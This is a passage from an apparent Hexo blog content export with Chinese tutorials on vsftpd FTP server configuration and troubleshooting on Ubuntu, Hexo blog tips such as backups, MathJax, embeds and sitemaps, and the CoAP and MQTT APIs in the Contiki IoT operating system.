<p>　　<strong>chroot_list_enable：</strong> 是否启动限制用户的名单 YES 为启用  NO 禁用。（包括注释掉也为禁用）</p>
<p>　　<strong>chroot_list_file=/etc/vsftpd/chroot_list：</strong> 是否限制在主目录下的用户名单，至于是限制名单还是排除名单，这取决于 chroot_local_user 的值。文件默认是并不存在，需要手动创建。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/14-1.png" alt="14-1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">chroot_local_user=YES</div><div class="line">chroot_list_enable=YES</div><div class="line">chroot_list_file=/etc/vsftpd.chroot_list</div></pre></td></tr></table></figure>
<p>　　我是用的是全局禁止跳出主目录，使用 chroot_list 添加例外！即，chroot_local_user=YES，chroot_list_enable=YES</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">pam_service_name=vsftpd（这里有可能会出现530的错误，导致ftp用户无法登录，与后面的认证配置文件有关）</div></pre></td></tr></table></figure>
<p>　　530 错误：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/14-2.png" alt="14-2"></p>
<h5 id="权限限制用户列表"><a href="#权限限制用户列表" class="headerlink" title="权限限制用户列表"></a>权限限制用户列表</h5><p>　　修改权限限制用户列表文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/vsftpd.chroot_list</span></div></pre></td></tr></table></figure>
<p>　　具体作用与 chroot_local_user 和 chroot_list_enable 的配置有关，参考上面的表格进行相应的添加或删除，一行对应一个用户。</p>
<h5 id="认证配置文件"><a href="#认证配置文件" class="headerlink" title="认证配置文件"></a>认证配置文件</h5><p>　　修改可访问用户列表文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/vsftpd.chroot_list</span></div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># Standard behaviour for ftpd(8).</div><div class="line">auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed</div><div class="line"></div><div class="line"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</div><div class="line"></div><div class="line"># Standard pam includes</div><div class="line">@include common-account</div><div class="line">@include common-session</div><div class="line">@include common-auth</div><div class="line">#auth   required        pam_shells.so</div></pre></td></tr></table></figure>
<p>　　<strong>在这里，注释掉最后一行可以避免 530 错误。</strong></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/14-3.png" alt="14-3"></p>
<h4 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h4><h5 id="添加-FTP-用户"><a href="#添加-FTP-用户" class="headerlink" title="添加 FTP 用户"></a>添加 FTP 用户</h5><ul>
<li>创建用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo useradd username</span></div></pre></td></tr></table></figure>
<p>　　Linux 的 useradd 命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">useradd(选项)(参数)</div></pre></td></tr></table></figure>
<p>　　选项参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">-c&lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中；</div><div class="line">-d&lt;登入目录&gt;：指定用户登入时的启始目录</div><div class="line">-D：变更预设值；</div><div class="line">-e&lt;有效期限&gt;：指定帐号的有效期限；</div><div class="line">-f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号；</div><div class="line">-g&lt;群组&gt;：指定用户所属的群组；</div><div class="line">-G&lt;群组&gt;：指定用户所属的附加群组；</div><div class="line">-m：自动建立用户的登入目录；</div><div class="line">-M：不要自动建立用户的登入目录；</div><div class="line">-n：取消建立以用户名称为名的群组；</div><div class="line">-r：建立系统帐号；</div><div class="line">-s：指定用户登入后所使用的shell；</div><div class="line">-u：指定用户id。</div></pre></td></tr></table></figure>
<ul>
<li>设置用户口令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo passwd username</span></div></pre></td></tr></table></figure>
<p>　　然后输入两次密码即可。</p>
<h5 id="删除-FTP-用户"><a href="#删除-FTP-用户" class="headerlink" title="删除 FTP 用户"></a>删除 FTP 用户</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo userdel username</span></div></pre></td></tr></table></figure>
<h4 id="卸载vsftpd"><a href="#卸载vsftpd" class="headerlink" title="卸载vsftpd"></a>卸载vsftpd</h4><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get remove --purge vsftpd</span></div></pre></td></tr></table></figure>
<p>　　–purge 选项表示彻底删除改软件和相关文件</p>
<h4 id="无权限错误"><a href="#无权限错误" class="headerlink" title="无权限错误"></a>无权限错误</h4><p>　　使用 cmd 的 FTP 可以正常登录，但是使用 Windows 的文件管理器登录到 FTP 服务器时报错的问题：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/14-4.png" alt="14-4"></p>
<p>　　在主配置文件中添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">pasv_promiscuous=YES</div></pre></td></tr></table></figure>
<p>　　此选项激活将关闭 pasv 的安全检查，关于 FTP 的 port 模式和 pasv 模式将在以后的博客中介绍。</p>
<h4 id="500-OOPS-错误"><a href="#500-OOPS-错误" class="headerlink" title="500 OOPS 错误"></a>500 OOPS 错误</h4><p>　　500 OOPS: vsftpd: refusing to run with writable root inside</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/14-5.png" alt="14-5"></p>
<p>　　在主配置文件中添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">allow_writeable_chroot=YES</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages + Hexo 搭建博客（四）</title>
    <url>/2017/08/10/Github%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    <content><![CDATA[<p>　　Hexo 的前三篇博客已经能够完整地搭建博客，此篇博客主要介绍了自己在使用 Hexo 期间遇到的一些问题以及解决问题的工具。</p>
<a id="more"></a>
<h4 id="博客备份工具"><a href="#博客备份工具" class="headerlink" title="博客备份工具"></a>博客备份工具</h4><p>　　一直想着怎么把博客备份一下，以便丢失时或者是换电脑时能够接着写博客，终于找到一个靠谱的插件，直接将文件备份在博客的仓库中的不同分支，十分方便。</p>
<p>　　项目地址：<a href="https://github.com/coneycode/hexo-git-backup" target="_blank" rel="external">https://github.com/coneycode/hexo-git-backup</a></p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>　　如果 hexo 的版本是 2.x.x 则执行如下命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> npm install hexo-git-backup@0.0.91 --save</div></pre></td></tr></table></figure>
<p>　　如果 hexo 的版本是 3.x.x， 则执行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> npm install hexo-git-backup --save</div></pre></td></tr></table></figure>
<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>　　在站点配置文件 _config.yml 中添加如下信息：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><div class="line"><span class="attr">backup:</span></div><div class="line"><span class="attr">  type:</span> <span class="string">git</span>     <span class="comment"># 指定提交类型</span></div><div class="line"><span class="attr">  message:</span> <span class="string">update</span> <span class="string">xxx</span>   <span class="comment"># 添加git commit信息</span></div><div class="line"><span class="attr">  repository:</span>   <span class="comment"># 指定仓库类型和地址</span></div><div class="line"><span class="attr">    github:</span> <span class="string">git@github.com:xxx/xxx.git,分支名字</span></div></pre></td></tr></table></figure>
<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>　　使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> hexo backup</div></pre></td></tr></table></figure>
<p>　　或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> hexo b</div></pre></td></tr></table></figure>
<p>　　备份成功后，可以在 Github 上查看我们新建的备份分支。</p>
<h4 id="使用Latex数学公式"><a href="#使用Latex数学公式" class="headerlink" title="使用Latex数学公式"></a>使用Latex数学公式</h4><p>　　Hexo 默认使用 “hexo-renderer-marked” 引擎渲染网页，该引擎会把一些特殊的 markdown 符号转换为相应的 html 标签，比如在 markdown 语法中，下划线 ‘_’ 代表斜体，会被渲染引擎处理为 <em> 标签。</em></p>
<p>　　因为类Latex格式书写的数学公式下划线 ‘_’ 表示下标，有特殊的含义，如果被强制转换为<em>标签，那么MathJax引擎在渲染数学公式的时候就会出错。例如，$x_i$在开始被渲染的时候，处理为$x<em>i</em>$，这样MathJax引擎就认为该公式有语法错误，因为不会渲染。</em></p>
<p>　　类似的语义冲突的符号还包括’*’, ‘{‘, ‘}’, ‘\’等。</p>
<p>　　进入到主题目录，找到_config.yml配置问题，把mathjax默认的false修改为true，具体如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><div class="line"><span class="comment"># MathJax Support</span></div><div class="line"><span class="attr">mathjax:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  per_page:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>　　此外，还需要在文章的Front-matter里打开mathjax开关，如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: index.html</div><div class="line">date: 2017-03-28 21:01:30</div><div class="line">tags:</div><div class="line"><span class="section">mathjax: true</span></div><div class="line">--</div></pre></td></tr></table></figure>
<h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><p>　　前面说过使用七牛云进行图片存储，其实也可以直接使用我们的 Hexo github 仓库进行图片存储。</p>
<p>　　方法一：在 <code>hexo/source</code> 目录下新建一个 <code>img</code> 文件夹，将图片放入该文件夹下，插入图片时链接即为 <code>/img/图片名称</code></p>
<p>　　方法二：直接将图片放在 public 目录下对应的博客文章的目录下。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">![<span class="string">你想输入的替代文字</span>](<span class="link">xxxx/图片名.jpg</span>)</div></pre></td></tr></table></figure>
<p>　　但是，这样做也存在一定的缺点，因为 Github 仓库的的大小也是受限的，所以图片太多就比较麻烦了，所以还是建议用图床等其他云存储方式。</p>
<h4 id="插入音乐"><a href="#插入音乐" class="headerlink" title="插入音乐"></a>插入音乐</h4><p>　　网音乐云音乐，虾米音乐都可以生成内嵌音乐的 html 代码，在其网页端找到喜欢的歌曲，点击分享按钮，把里面的代码复制下来，直接粘贴到博文中即可:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">"no"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">marginwidth</span>=<span class="string">"0"</span> <span class="attr">marginheight</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span>   </span></div><div class="line">    <span class="attr">src</span>=<span class="string">"http://music.163.com/outchain/player?type=2&amp;id=450853439&amp;auto=1&amp;height=66"</span>&gt;  </div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="插入视频"><a href="#插入视频" class="headerlink" title="插入视频"></a>插入视频</h4><p>　　将优酷等视频平台提供的视频外链或者自己制作的视频外链替换掉如下 src 的值即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span>   </span></div><div class="line">    <span class="attr">height</span>=<span class="string">498</span> <span class="attr">width</span>=<span class="string">510</span>   </div><div class="line">    <span class="attr">src</span>=<span class="string">"http://player.youku.com/embed/XNjcyMDU4Njg0"</span>   </div><div class="line">    <span class="attr">frameborder</span>=<span class="string">0</span> <span class="attr">allowfullscreen</span>&gt;  </div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="百度-google收录你的站点"><a href="#百度-google收录你的站点" class="headerlink" title="百度/google收录你的站点"></a>百度/google收录你的站点</h4><h5 id="安装sitemap插件"><a href="#安装sitemap插件" class="headerlink" title="安装sitemap插件"></a>安装sitemap插件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> npm install hexo-generator-sitemap --save  # google</div><div class="line"><span class="meta">$</span> npm install hexo-generator-baidu-sitemap --save  # 百度</div></pre></td></tr></table></figure>
<p>　　在站点配置文件 <code>_config.yml</code> 中添加如下代码：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 自动生成sitemap</span></div><div class="line"><span class="attr">sitemap:</span></div><div class="line"><span class="attr">  path:</span> <span class="string">sitemap.xml</span></div><div class="line"><span class="attr">baidusitemap:</span></div><div class="line"><span class="attr">  path:</span> <span class="string">baidusitemap.xml</span></div></pre></td></tr></table></figure>
<p>　　执行 <code>hexo -g</code> 后会在 public 目录下生成 baidusitmap.xml 和 sitemap.xml 两个文件。</p>
<h4 id="Hexo-3-xx版本的问题"><a href="#Hexo-3-xx版本的问题" class="headerlink" title="Hexo 3.xx版本的问题"></a>Hexo 3.xx版本的问题</h4><p>　　Hexo 3.0 把服务器独立成了个别模块，您必须先安装 hexo-server 才能使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> npm install hexo-server --save</div></pre></td></tr></table></figure>
<p>　　安装完成后，输入以下命令以启动服务器，您的网站会在 <a href="http://localhost:4000" target="_blank" rel="external">http://localhost:4000</a> 下启动。在服务器启动期间，Hexo 会监视文件变动并自动更新，您无须重启服务器。</p>
<p>　　然后，通过如下命令可开启本地预览：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> hexo server</div></pre></td></tr></table></figure>
<p>　　或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> hexo s</div></pre></td></tr></table></figure>
<p>　　如果您想要更改端口，或是在执行时遇到了 EADDRINUSE 错误，可以在执行时使用 -p 选项指定其他端口，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> hexo server -p 5000</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki中CoAP协议实现</title>
    <url>/2017/07/16/Contiki%20%E4%B8%AD%20CoAP%20%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>　　CoAP（Constrained Application Protocol）协议是为物联网中资源受限设备制定的应用层协议。</p>
<a id="more"></a>
<h4 id="CoAP协议简介"><a href="#CoAP协议简介" class="headerlink" title="CoAP协议简介"></a>CoAP协议简介</h4><p>　　CoAP 协议是为物联网中资源受限设备制定的应用层协议。CoAP 旨在轻松转换为 HTTP，以简化与 Web 的集成，同时满足组播支持，非常低的开销和简单性等特殊要求。</p>
<p>　　CoAP 可以在大多数支持 UDP 的设备上运行。CoAP 使用两种消息类型，请求和响应，使用简单的二进制基本头文件格式。基本标题后面可以是优化的类型长度值格式的选项。默认情况下，CoAP 绑定到 UDP，并可选择为 DTLS（数据报传输层安全），提供高水平的通信安全性。</p>
<p>　　逻辑上分为 Message 和 Request/Response 两层（如下图），Request/Response 通过Message承载，从封包上不体现这种层次结构。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/7/15-1.png" alt="15-1"></p>
<h4 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h4><p>　　REST（Representational State Transfer，表述性状态转移）依赖于无状态的、客户机-服务器，可缓存的通信协议。</p>
<p>　　RESTful Web 服务的关键抽象就是资源而不是服务。一般来说，传感器，执行器和控制系统可以优雅地表现为通过 RESTful Web 服务暴露的资源及其服务。</p>
<p>　　RESTful 应用程序使用类似HTTP的请求来发布数据（创建和/或更新），读取数据（例如查询）和删除数据。因此，REST 对所有四个 CRUD（创建/读取/更新/删除）操作都使用 HTTP。</p>
<h4 id="CoAP-API"><a href="#CoAP-API" class="headerlink" title="CoAP API"></a>CoAP API</h4><p>　　Contiki 的 CoAP 实现基于 Erbium（Er），一种低功耗的 Contiki 的 REST 引擎。 REST 引擎包括一个全面的嵌入式 CoAP 实现，成为 Contiki 中的官方。</p>
<p>　　CRUD（create, read, update, delete）操作：</p>
<ul>
<li>POST: Create a resource</li>
<li>GET: Retrieve a resource</li>
<li>PUT: Update a resource</li>
<li>DELETE: Delete a resource</li>
</ul>
<p>　　服务器上有各种可用的资源。服务器上的每个资源都有一个处理函数，REST 层调用它来为客户端的请求提供服务。REST 服务器将请求的内容发送回客户端。</p>
<h5 id="RESTful-资源定义"><a href="#RESTful-资源定义" class="headerlink" title="RESTful 资源定义"></a>RESTful 资源定义</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/* data structure representing a resource in REST */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">resource_s</span> &#123;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">resource_s</span> *<span class="title">next</span>;</span>        <span class="comment">/* for LIST, points to next resource defined */</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *url;                <span class="comment">/*handled URL */</span></div><div class="line">  <span class="keyword">rest_resource_flags_t</span> flags;    <span class="comment">/* handled RESTful methods */</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *attributes;         <span class="comment">/* link-format attributes */</span></div><div class="line">  restful_handler get_handler;    <span class="comment">/* handler function */</span></div><div class="line">  restful_handler post_handler;   <span class="comment">/* handler function */</span></div><div class="line">  restful_handler put_handler;    <span class="comment">/* handler function */</span></div><div class="line">  restful_handler delete_handler; <span class="comment">/* handler function */</span></div><div class="line">  <span class="keyword">union</span> &#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">periodic_resource_s</span> *<span class="title">periodic</span>;</span> <span class="comment">/* special data depending on flags */</span></div><div class="line">    restful_trigger_handler trigger;</div><div class="line">    restful_trigger_handler resume;</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">resource_s</span> <span class="title">resource_t</span>;</span></div></pre></td></tr></table></figure>
<h5 id="五种RESTful资源类型"><a href="#五种RESTful资源类型" class="headerlink" title="五种RESTful资源类型"></a>五种RESTful资源类型</h5><ul>
<li>RESOURCE</li>
</ul>
<p>　　normal resource，由与资源处理函数相关联的静态 Uri-Path 定义。这是所有其他资源类型的基础。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler) \</span></div><div class="line">  resource_t name = &#123; NULL, NULL, NO_FLAGS, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125;</div></pre></td></tr></table></figure>
<ul>
<li>PARENT_RESOURCE</li>
</ul>
<p>　　parent resource，通过评估可能长于父资源的 Uri-Path 来管理多个子资源。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PARENT_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler) \</span></div><div class="line">  resource_t name = &#123; NULL, NULL, HAS_SUB_RESOURCES, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125;</div></pre></td></tr></table></figure>
<ul>
<li>SEPARATE_RESOURCE</li>
</ul>
<p>　　separate resource，如果服务器不能立即响应 CON 请求，它只需用空的 ACK 消息进行响应，以便客户端可以停止重新发送请求。过了一会儿，当服务器准备好响应时，它将响应作为 CON 消息发送。以下宏允许创建具有单独响应的 CoAP 资源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SEPARATE_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, resume_handler) \</span></div><div class="line">  resource_t name = &#123; NULL, NULL, IS_SEPARATE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .resume = resume_handler &#125; &#125;</div></pre></td></tr></table></figure>
<ul>
<li>EVENT_RESOURCE</li>
</ul>
<p>　　event resource，事件资源类似于周期性资源，但第二个处理程序是由非周期性事件调用的，例如按下一个按钮。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> EVENT_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, event_handler) \</span></div><div class="line">  resource_t name = &#123; NULL, NULL, IS_OBSERVABLE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .trigger = event_handler &#125; &#125;</div></pre></td></tr></table></figure>
<p>　　如果我们需要声明一个定期的资源，例如轮询传感器并发布更改的值给订阅的客户端，那么我们应该使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * Macro to define a periodic resource.</div><div class="line"> * The corresponding [name]_periodic_handler() function will be called every period.</div><div class="line"> * For instance polling a sensor and publishing a changed value to subscribed clients would be done there.</div><div class="line"> * The subscriber list will be maintained by the final_handler rest_subscription_handler() (see rest-mapping header file).</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PERIODIC_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, period, periodic_handler) \</span></div><div class="line">  periodic_resource_t periodic_##name; \</div><div class="line">  resource_t name = &#123; NULL, NULL, IS_OBSERVABLE | IS_PERIODIC, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .periodic = &amp;periodic_##name &#125; &#125;; \</div><div class="line">  periodic_resource_t periodic_##name = &#123; NULL, &amp;name, period, &#123; &#123; 0 &#125; &#125;, periodic_handler &#125;;</div></pre></td></tr></table></figure>
<p>　　请注意，PERIODIC_RESOURCE 和 EVENT_RESOURCE 可以被观察到，这意味着可以向客户端通知给定资源中的任何更改。</p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>　　初始化 REST 框架并启动 HTTP 或 CoAP 进程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * \brief      Initializes REST framework and starts the HTTP or CoAP process.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rest_init_engine</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div></pre></td></tr></table></figure>
<h4 id="激活资源"><a href="#激活资源" class="headerlink" title="激活资源"></a>激活资源</h4><p>　　然后对于每个声明的资源，我们想要访问</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> *</div><div class="line"> * \brief Resources wanted to be accessible should be activated with the following code.</div><div class="line"> * \param resource</div><div class="line"> *             A RESTful resource defined through the RESOURCE macros.</div><div class="line"> * \param path</div><div class="line"> *             The local URI path where to provide the resource.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rest_activate_resource</span><span class="params">(<span class="keyword">resource_t</span> *resource, <span class="keyword">char</span> *path)</span></span>;</div></pre></td></tr></table></figure>
<p>　　例如：</p>
<p>　　定义资源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">RESOURCE(res_hello,</div><div class="line">        <span class="string">"title=\"Hello world: ?len=0..\";rt=\"Text\""</span>,</div><div class="line">        res_get_handler,</div><div class="line">        <span class="literal">NULL</span>,</div><div class="line">        <span class="literal">NULL</span>,</div><div class="line">        <span class="literal">NULL</span>);</div></pre></td></tr></table></figure>
<p>　　激活资源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">rest_activate_resource(&amp;res_hello, <span class="string">"test/hello"</span>);</div></pre></td></tr></table></figure>
<p>　　访问资源：</p>
<p>　　资源的URI路径为：test/hello</p>
<h5 id="获取可用资源列表"><a href="#获取可用资源列表" class="headerlink" title="获取可用资源列表"></a>获取可用资源列表</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * \brief Returns the list of registered RESTful resources.</div><div class="line"> * \return     The resource list.</div><div class="line"> */</div><div class="line"><span class="keyword">list_t</span> rest_get_resources(<span class="keyword">void</span>);</div></pre></td></tr></table></figure>
<p>　　强制性 CoAP 端口是 5683。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>Contiki</tag>
        <tag>CoAP</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki 中 MQTT 协议实现</title>
    <url>/2017/06/30/Contiki%20%E4%B8%AD%20MQTT%20%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>　　6LoWPAN 无线传感网络中无线传感节点采用 MQTT 作为应用层协议是一种很好的选择，通过结合边界路由器、MQTT 代理服务器和远程客户端可以实现无线传感网络的数据上传、管理以及远程控制等功能。本文通过 Contiki 操作系统中实现的 MQTT 协议来介绍 6LoWPAN 中 MQTT 客户端功能的实现。</p>
<a id="more"></a>
<h4 id="MQTT简介"><a href="#MQTT简介" class="headerlink" title="MQTT简介"></a>MQTT简介</h4><p>　　MQTT（Message Queuing Telemetry Transport，即消息队列遥测传输协议）是基于 TCP/IP 协议的基于发布订阅的消息传递协议。它被设计用于与需要“小代码占用”或网络带宽有限的远程位置的连接。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-1.png" alt="7-1"></p>
<p>　　实现 MQTT 协议需要：客户端和服务器端。</p>
<p>　　MQTT 协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。</p>
<p>　　MQTT 传输的消息分为：主题（Topic）和负载（payload）两部分。</p>
<p>　　Topic 可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload），可以理解为消息的内容，是指订阅者具体要使用的内容。
　　</p>
<h4 id="MQTT-API"><a href="#MQTT-API" class="headerlink" title="MQTT API"></a>MQTT API</h4><p>　　MQTT 的实现在 Contiki 的 apps/mqtt 目录下，它使用 tcp-socket 库，当前在 Contiki 中 MQTT 的实现只支持 QoS 0 和 1。</p>
<h5 id="MQTT-注册"><a href="#MQTT-注册" class="headerlink" title="MQTT 注册"></a>MQTT 注册</h5><p><strong>注意：初始化MQTT引擎，必须在使用任何其他MQTT函数之前调用。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 初始化MQTT引擎.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param app_process 指向处理MQTT连接的应用程序进程的指针.</div><div class="line">* \param client_id 指向MQTT客户端ID的指针.</div><div class="line">* \param event_callback 回调函数负责处理来自MQTT引擎的回调.</div><div class="line">* \param max_segment_size MQTT/TCP连接的最大TCP分片大小.</div><div class="line">* \return MQTT_STATUS_OK or MQTT_STATUS_INVALID_ARGS_ERROR</div><div class="line">*/</div><div class="line"><span class="keyword">mqtt_status_t</span> mqtt_register(struct mqtt_connection *conn,</div><div class="line">                            struct process *app_process,</div><div class="line">                            <span class="keyword">char</span> *client_id,</div><div class="line">                            <span class="keyword">mqtt_event_callback_t</span> event_callback,</div><div class="line">                            <span class="keyword">uint16_t</span> max_segment_size);</div></pre></td></tr></table></figure>
<h5 id="MQTT-连接"><a href="#MQTT-连接" class="headerlink" title="MQTT 连接"></a>MQTT 连接</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 连接到一个MQTT代理.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">* \param host MQTT代理服务器的IP地址.</div><div class="line">* \param port MQTT代理的MQTT服务端口.</div><div class="line">* \param keep_alive 保持连接的心跳频率，服务器端从客户端接收消息的最大时间间隔.</div><div class="line">* \return MQTT_STATUS_OK or an error status</div><div class="line">*/</div><div class="line"><span class="keyword">mqtt_status_t</span> mqtt_connect(struct mqtt_connection *conn,</div><div class="line">                            <span class="keyword">char</span> *host,</div><div class="line">                            <span class="keyword">uint16_t</span> port,</div><div class="line">                            <span class="keyword">uint16_t</span> keep_alive);</div></pre></td></tr></table></figure>
<h5 id="MQTT-断开连接"><a href="#MQTT-断开连接" class="headerlink" title="MQTT 断开连接"></a>MQTT 断开连接</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* \brief 与MQTT代理断开连接.</div><div class="line">* \param conn 指向MQTT连接的指针.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mqtt_disconnect</span><span class="params">(struct mqtt_connection *conn)</span></span>;</div></pre></td></tr></table></figure>
